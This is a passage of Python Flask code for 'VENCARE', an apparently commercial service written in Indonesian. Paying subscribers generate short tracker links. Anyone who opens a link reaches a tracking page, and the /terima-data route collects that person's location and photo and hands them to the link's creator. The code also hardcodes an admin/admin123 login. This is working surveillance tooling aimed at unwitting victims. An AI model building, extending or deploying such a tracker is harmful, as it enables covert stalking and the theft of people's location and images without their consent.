        return jsonify({"berhasil":False, "pesan":f"⚠️ Slot maksimal {JUMLAH_MAKSIMAL_AKTIF} pengguna aktif sudah penuh."})

    for u, data in DAFTAR_PENGGUNA.items():
        if data['id'] == user_id:
            pkt = data.get('paket', 'harian')
            durasi = 7 if pkt == 'mingguan' else 1
            kadaluarsa_dt = datetime.now() + timedelta(days=durasi)
            data['status_bayar'] = True
            data['kadaluarsa'] = kadaluarsa_dt.strftime('%d-%m-%Y %H:%M:%S')
            return jsonify({"berhasil":True, "pesan":f"Akun {u} berhasil diaktifkan selama {durasi} hari!"})
    return jsonify({"berhasil":False, "pesan":"User tidak ditemukan"})

@app.route('/admin/data-pengguna')
def admin_data():
    if not session.get('admin'): return jsonify({"daftar":[]}),403
    daftar=[]
    for n,d in DAFTAR_PENGGUNA.items():
        uid = d['id']
        daftar.append({
            "id":uid, "nama":n, "waktu":d['waktu_daftar'],
            "langganan_aktif":cek_masa_aktif(uid),
            "bukti":d.get('bukti'), "paket":d.get('paket')
        })
    return jsonify({"daftar":daftar})

@app.route('/buat-link', methods=['POST'])
def buat_link():
    uid = session.get('user_id')
    if not session.get('admin') and not cek_masa_aktif(uid):
        return jsonify({"pesan":"❌ Fitur dikunci! Anda belum membayar atau masa aktif sudah habis."})

    d = request.get_json()
    k = ''.join(random.choices(string.ascii_letters+string.digits,k=6))
    daftar_link[k] = {"tujuan":d.get('tujuan'), "pembuat":uid}
    return jsonify({"link_pelacak":request.host_url.rstrip('/')+"/l/"+k})

@app.route('/l/<kode>')
def hal_pelacak(kode):
    if kode in daftar_link:
        return buat_halaman_pelacak(daftar_link[kode]['tujuan'])
    return "❌ Link tidak ditemukan"

@app.route('/terima-data', methods=['POST'])
def terima_data():
    d = request.get_json()
    tujuan_link = d.get('kode')
    pembuat_id = "UNKNOWN"
    for k, v in daftar_link.items():
        if v['tujuan'] == tujuan_link:
            pembuat_id = v['pembuat']
            break

    DATA_MASUK.insert(0, {
        "waktu": datetime.now().strftime('%d-%m-%Y %H:%M:%S'),
        "lokasi": d.get('lokasi'),
        "foto": d.get('foto'),
        "pembuat": pembuat_id
    })
    return jsonify({"status":"ok"})

@app.route('/data-masuk')
def ambil_data():
    uid = session.get('user_id')
    if session.get('admin'):
        return jsonify({"daftar": DATA_MASUK[:30]})
    data_user = [item for item in DATA_MASUK if item.get('pembuat') == uid]
    return jsonify({"daftar": data_user[:20]})

if __name__ == '__main__':
    print(f"\n{KUNING}{'═'*50}{RESET}")
    print(f"{HIJAU}🚀 VENCARE — FITUR CHAT ADMIN & PENGGUNA SIAP!{RESET}")
    print(f"{HIJAU}📦 PAKET: Harian Rp50.000 | Mingguan Rp150.000{RESET}")
    print(f"{HIJAU}👥 MAKSIMAL SLOT AKTIF: {JUMLAH_MAKSIMAL_AKTIF} orang{RESET}")
    print(f"{KUNING}🛡️ AKUN ADMIN: admin / admin123{RESET}")
    print(f"{KUNING}{'═'*50}{RESET}\n")
    app.run(host='0.0.0.0', port=8080, debug=False)
